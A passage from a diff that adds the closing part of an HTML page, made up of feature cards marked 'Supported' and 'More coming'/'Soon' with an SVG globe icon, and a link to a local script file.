+              <span class="dex-tag dex-on"><i></i> Supported</span>
+            </div>
+            <div class="dex-card dex-soon">
+              <div class="dex-l">
+                <span class="dex-logo"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="12" r="10" />
+                    <path d="M2 12h20" />
+                    <path
+                      d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
+                  </svg></span>
+                <span class="dex-name dex-blur">More coming</span>
+              </div>
+              <span class="dex-tag">Soon</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+
+</html>
